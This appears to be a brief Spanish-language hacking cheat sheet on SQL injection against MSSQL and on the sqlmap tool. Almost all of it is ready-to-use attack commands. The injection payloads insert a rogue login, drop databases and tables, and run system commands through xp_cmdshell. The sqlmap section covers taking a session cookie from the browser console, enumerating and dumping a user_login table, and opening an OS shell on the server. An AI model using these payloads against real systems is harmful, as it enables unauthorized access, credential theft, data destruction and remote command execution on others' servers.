# Inyecciones SQL 

Tags: #Hacking #SQLI #MSSQL #SQLMap 

## DB MSSQL 

```bash 
❯ hi';insert into login values("omar","apple123"); --   # Agregar un usuario por medio de una SQL Blind'
❯ hi';CREATE DATABASE mydatabase; --                    # Crear una DB' 
❯ hi';DROP DATABASE mydatabase; --                      # Borrar la DB' 
❯ hi';DROP TABLE table_name; --                         # Borrar una tabla' 

❯ hi';exec master..xp_cmdshell 'ping www.google.com -l 65000 -t';--    # Hacer ping a un host especifico' 
```

## SQLMap 

```bash 
# Kali Tool

Nota:
	1. Se necesita estar dentro con credenciales validas para asi obtener la cookie 
	2. Buscar el campo donde se encuentre el 'id=1' 
	3. Ir al 'Inspector', dar click en 'Console' y colocar '>> document.cookie'

❯ sqlmap -u "http://domain.com/file.aspx?id=1" --cookie="cookie_value" --dbs   # Muestra las DBs
❯ sqlmap -u "http://domain.com/file.aspx?id=1" --cookie="cookie_value" -D database --tables 
❯ sqlmap -u "http://domain.com/file.aspx?id=1" --cookie="cookie_value" -D database -T user_login --dump
❯ sqlmap -u "http://domain.com/file.aspx?id=1" --cookie="cookie_value" --os-shell  # Obtener un shell 'Y'
	❯ hostname       # Si quieremos tener el 'standar output' dar click en 'Y'
	❯ tasklist 
	❯ help
```